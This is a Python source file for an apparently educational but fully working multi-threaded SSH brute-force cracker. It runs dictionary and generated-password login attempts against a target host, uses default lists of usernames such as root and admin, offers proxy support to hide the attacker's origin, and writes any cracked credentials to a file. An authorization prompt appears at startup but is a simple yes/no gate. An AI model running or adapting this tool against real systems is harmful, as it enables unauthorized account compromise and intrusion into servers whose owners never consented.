#!/usr/bin/env python3
"""
Advanced SSH Brute-Force Tool
By Inlighn Tech

Multi-threaded SSH cracker supporting username lists, password lists,
dynamic password generation, retry mechanisms, and proxy support.
"""

import paramiko
import time
import sys
import os
import threading
import queue
import itertools
import string
import socket
from datetime import datetime
import argparse
from typing import List, Dict, Optional, Tuple, Generator

# Color codes
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

class AdvancedSSHCracker:
    """Advanced multi-threaded SSH brute-force cracker."""
    
    def __init__(self, target: str, port: int = 22, verbose: bool = False):
        """
        Initialize advanced SSH cracker.
        
        Args:
            target: Target IP or hostname
            port: SSH port
            verbose: Enable verbose output
        """
        self.target = target
        self.port = port
        self.verbose = verbose
        self.attempts = 0
        self.successful_creds = []
        self.found_lock = threading.Lock()
        self.stop_flag = threading.Event()
        self.attempts_lock = threading.Lock()
        
        # Statistics
        self.start_time = None
        self.end_time = None
        
    def print_banner(self):
        """Display advanced tool banner."""
        banner = f"""
{Colors.CYAN}{'='*60}
    ADVANCED SSH BRUTE-FORCE TOOL
    By Inlighn Tech
    Multi-Threaded | Dictionary | Brute-Force | Proxy-Ready
{'='*60}
{Colors.YELLOW}Target: {self.target}:{self.port}
{Colors.END}{'='*60}{Colors.END}
"""
        print(banner)
    
    def test_credentials(self, username: str, password: str, timeout: int = 5, 
                         proxy: Dict = None) -> Tuple[bool, str, str, str]:
        """
        Test a single username-password combination.
        
        Args:
            username: Username to test
            password: Password to test
            timeout: Connection timeout
            proxy: Optional proxy configuration
            
        Returns:
            Tuple of (success, username, password, error_message)
        """
        with self.attempts_lock:
            self.attempts += 1
        
        ssh = None
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Optional proxy support (only if proxy module is available)
            sock = None
            if proxy:
                try:
                    import socks
                    sock = socks.socksocket()
                    sock.set_proxy(socks.HTTP, proxy['host'], proxy['port'])
                except ImportError:
                    print(f"{Colors.YELLOW}[!] PySocks not installed. Proxy disabled.{Colors.END}")
                    pass
            
            # Attempt connection
            ssh.connect(
                hostname=self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False,
                sock=sock if proxy and sock else None
            )
            
            ssh.close()
            return True, username, password, None
            
        except paramiko.AuthenticationException:
            return False, username, password, "Auth Failed"
            
        except paramiko.SSHException as e:
            return False, username, password, f"SSH Error: {str(e)}"
            
        except socket.timeout:
            return False, username, password, "Timeout"
            
        except socket.error as e:
            return False, username, password, f"Socket Error: {str(e)}"
            
        except Exception as e:
            return False, username, password, f"Error: {str(e)}"
        finally:
            if ssh:
                ssh.close()
    
    def load_usernames(self, username_file: str = None, single_username: str = None) -> List[str]:
        """
        Load usernames from file or use single username.
        
        Returns:
            List of usernames
        """
        usernames = []
        
        if single_username:
            usernames = [single_username]
        elif username_file and os.path.exists(username_file):
            with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
        else:
            # Default common usernames
            usernames = ['root', 'admin', 'user', 'ubuntu', 'centos', 'debian', 
                        'pi', 'test', 'administrator', 'oracle', 'postgres', 'mysql']
        
        print(f"{Colors.BLUE}[*] Loaded {len(usernames)} usernames{Colors.END}")
        return usernames
    
    def load_passwords(self, password_file: str = None, min_length: int = None, 
                       max_length: int = None, charset: str = None) -> Generator[str, None, None]:
        """
        Load passwords from file or generate dynamically.
        
        Args:
            password_file: Path to password list file
            min_length: Minimum length for generated passwords
            max_length: Maximum length for generated passwords
            charset: Character set for generated passwords
            
        Yields:
            Password strings
        """
        # Dictionary attack from file
        if password_file and os.path.exists(password_file):
            print(f"{Colors.BLUE}[*] Loading password list from file...{Colors.END}")
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if password:
                        yield password
            return
        
        # Brute-force generation
        if min_length and max_length:
            if charset is None:
                charset = string.ascii_lowercase + string.digits
            
            total_combinations = sum(len(charset) ** length for length in range(min_length, max_length + 1))
            print(f"{Colors.BLUE}[*] Generating passwords via brute-force...{Colors.END}")
            print(f"[*] Length: {min_length}-{max_length} | Charset size: {len(charset)}")
            print(f"[*] Total combinations: {total_combinations:,}{Colors.END}")
            
            for length in range(min_length, max_length + 1):
                for combination in itertools.product(charset, repeat=length):
                    yield ''.join(combination)
    
    def save_results(self, output_file: str = None):
        """Save successful credentials to file."""
        if not self.successful_creds:
            return
        
        if output_file is None:
            output_file = f"cracked_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(output_file, 'w') as f:
                f.write(f"SSH Credentials Found for {self.target}\n")
                f.write(f"Scan completed: {datetime.now()}\n")
                f.write("="*50 + "\n")
                for cred in self.successful_creds:
                    f.write(f"{cred['username']}:{cred['password']}\n")
            
            print(f"\n{Colors.GREEN}[✓] Results saved to: {output_file}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to save results: {e}{Colors.END}")
    
    def display_statistics(self):
        """Display attack statistics."""
        if not self.start_time:
            return
        
        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()
        rate = self.attempts / duration if duration > 0 else 0
        
        print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}ATTACK STATISTICS{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"Total attempts: {self.attempts:,}")
        print(f"Time elapsed: {duration:.2f} seconds")
        print(f"Attempts/second: {rate:.2f}")
        print(f"Successful credentials: {len(self.successful_creds)}")
        
        if self.successful_creds:
            print(f"\n{Colors.GREEN}{Colors.BOLD}FOUND CREDENTIALS:{Colors.END}")
            for cred in self.successful_creds:
                print(f"  ✓ {cred['username']}:{cred['password']}")
        
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")

def worker_thread(cracker: AdvancedSSHCracker, task_queue: queue.Queue, 
                  results_list: List, timeout: int, proxy: Dict = None):
    """
    Worker function for multi-threaded password testing.
    
    Args:
        cracker: AdvancedSSHCracker instance
        task_queue: Queue of (username, password) tasks
        results_list: List to store successful results
        timeout: Connection timeout
        proxy: Proxy configuration
    """
    while not cracker.stop_flag.is_set():
        try:
            username, password = task_queue.get(timeout=1)
        except queue.Empty:
            break
        
        success, user, pwd, error = cracker.test_credentials(username, password, timeout, proxy)
        
        if cracker.verbose and error and not success:
            print(f"{Colors.YELLOW}[*] Failed: {user}:{pwd} - {error}{Colors.END}")
        
        if success:
            with cracker.found_lock:
                result = {'username': user, 'password': pwd, 'timestamp': datetime.now()}
                results_list.append(result)
                cracker.successful_creds.append(result)
                cracker.stop_flag.set()  # Stop all threads
                print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] CREDENTIALS FOUND! {user}:{pwd}{Colors.END}")
        
        task_queue.task_done()
    
    return results_list

def main_advanced():
    """Main function for advanced SSH cracker."""
    parser = argparse.ArgumentParser(
        description="Advanced Multi-Threaded SSH Brute-Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Dictionary attack with username and password lists
  python advance_ssh_brute.py -t 192.168.1.100 -U users.txt -P passwords.txt -T 20
  
  # Brute-force with password generation
  python advance_ssh_brute.py -t 192.168.1.100 -u root --bruteforce -min 1 -max 4 -T 10
  
  # Single username, wordlist, with proxy
  python advance_ssh_brute.py -t target.com -u admin -P rockyou.txt --proxy-host 127.0.0.1 --proxy-port 8080
  
  # All usernames with generated passwords (advanced)
  python advance_ssh_brute.py -t 192.168.1.100 -U users.txt --bruteforce -min 4 -max 6 -chars "abc123" -T 50
        """
    )
    
    # Target configuration
    parser.add_argument("-t", "--target", required=True, help="Target SSH server (IP or hostname)")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    
    # Username options
    parser.add_argument("-u", "--username", help="Single username to test")
    parser.add_argument("-U", "--username-list", help="File containing usernames (one per line)")
    
    # Password options
    parser.add_argument("-P", "--password-list", help="File containing passwords (one per line)")
    parser.add_argument("--bruteforce", action="store_true", help="Enable brute-force password generation")
    parser.add_argument("-min", "--min-length", type=int, default=1, help="Minimum password length (brute-force)")
    parser.add_argument("-max", "--max-length", type=int, default=4, help="Maximum password length (brute-force)")
    parser.add_argument("-chars", "--charset", default=None, help="Character set for brute-force (default: a-z0-9)")
    
    # Attack configuration
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout (seconds)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    # Proxy options
    parser.add_argument("--proxy-host", help="Proxy host (HTTP proxy)")
    parser.add_argument("--proxy-port", type=int, help="Proxy port")
    
    # Output options
    parser.add_argument("-o", "--output", help="Output file for successful credentials")
    
    args = parser.parse_args()
    
    # Legal disclaimer
    print(f"{Colors.RED}{Colors.BOLD}")
    print("⚠️  LEGAL DISCLAIMER ⚠️")
    print("="*60)
    print("This tool is for EDUCATIONAL PURPOSES and AUTHORIZED TESTING ONLY!")
    print("Unauthorized access is illegal. You must have EXPLICIT WRITTEN PERMISSION")
    print("from the system owner before using this tool.")
    print("="*60)
    print(f"{Colors.END}")
    
    response = input(f"{Colors.YELLOW}Do you have written authorization to test {args.target}? (yes/no): {Colors.END}")
    if response.lower() != 'yes':
        print(f"{Colors.RED}[!] Exiting. Always obtain proper authorization!{Colors.END}")
        sys.exit(0)
    
    # Initialize cracker
    cracker = AdvancedSSHCracker(args.target, args.port, args.verbose)
    cracker.print_banner()
    
    # Load usernames
    usernames = cracker.load_usernames(args.username_list, args.username)
    if not usernames:
        print(f"{Colors.RED}[!] No usernames provided!{Colors.END}")
        sys.exit(1)
    
    # Setup password generator
    if args.password_list:
        password_gen = cracker.load_passwords(password_file=args.password_list)
    elif args.bruteforce:
        password_gen = cracker.load_passwords(
            min_length=args.min_length,
            max_length=args.max_length,
            charset=args.charset
        )
    else:
        print(f"{Colors.RED}[!] No password source provided. Use -P or --bruteforce{Colors.END}")
        sys.exit(1)
    
    # Proxy configuration
    proxy = None
    if args.proxy_host and args.proxy_port:
        proxy = {'host': args.proxy_host, 'port': args.proxy_port}
        print(f"{Colors.BLUE}[*] Using proxy: {args.proxy_host}:{args.proxy_port}{Colors.END}")
    
    # Create task queue
    task_queue = queue.Queue()
    total_tasks = 0
    
    print(f"{Colors.BLUE}[*] Creating task queue...{Colors.END}")
    
    # Add tasks to queue (combine usernames with passwords)
    for username in usernames:
        # Reset password generator for each username
        if args.password_list:
            password_gen = cracker.load_passwords(password_file=args.password_list)
        elif args.bruteforce:
            password_gen = cracker.load_passwords(
                min_length=args.min_length,
                max_length=args.max_length,
                charset=args.charset
            )
        else:
            continue
        
        # Limit the number of passwords per username to avoid memory issues
        password_count = 0
        for password in password_gen:
            if cracker.stop_flag.is_set():
                break
            task_queue.put((username, password))
            total_tasks += 1
            password_count += 1
            
            # Optional: Limit password attempts per username (prevents infinite loops)
            if password_count > 1000000 and not args.bruteforce:
                break
    
    if total_tasks == 0:
        print(f"{Colors.RED}[!] No tasks created! Check your password source.{Colors.END}")
        sys.exit(1)
    
    print(f"[*] Total authentication attempts: {total_tasks:,}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Starting attack...{Colors.END}\n")
    
    # Start attack
    cracker.start_time = datetime.now()
    results = []
    
    # Create and start worker threads
    threads = []
    for _ in range(min(args.threads, total_tasks)):  # Don't create more threads than tasks
        t = threading.Thread(
            target=worker_thread,
            args=(cracker, task_queue, results, args.timeout, proxy)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Progress monitoring
    try:
        last_attempts = 0
        last_time = time.time()
        
        while any(t.is_alive() for t in threads) and not task_queue.empty():
            time.sleep(1)
            
            if args.verbose:
                current_time = time.time()
                time_diff = current_time - last_time
                attempts_diff = cracker.attempts - last_attempts
                rate = attempts_diff / time_diff if time_diff > 0 else 0
                
                print(f"\r[*] Attempts: {cracker.attempts:,}/{total_tasks:,} | "
                      f"Rate: {rate:.1f}/s | Queue: {task_queue.qsize()}", 
                      end="", flush=True)
                
                last_attempts = cracker.attempts
                last_time = current_time
            
            if cracker.stop_flag.is_set():
                break
        
        # Wait for queue to empty with timeout
        task_queue.join()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
        cracker.stop_flag.set()
    
    # Wait for threads to finish
    for t in threads:
        t.join(timeout=2)
    
    # Display statistics and save results
    cracker.display_statistics()
    
    if results:
        cracker.save_results(args.output)
    else:
        print(f"\n{Colors.RED}{Colors.BOLD}[✗] No valid credentials found!{Colors.END}")

if __name__ == "__main__":
    try:
        main_advanced()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Attack interrupted by user.{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Fatal error: {e}{Colors.END}")
        sys.exit(1)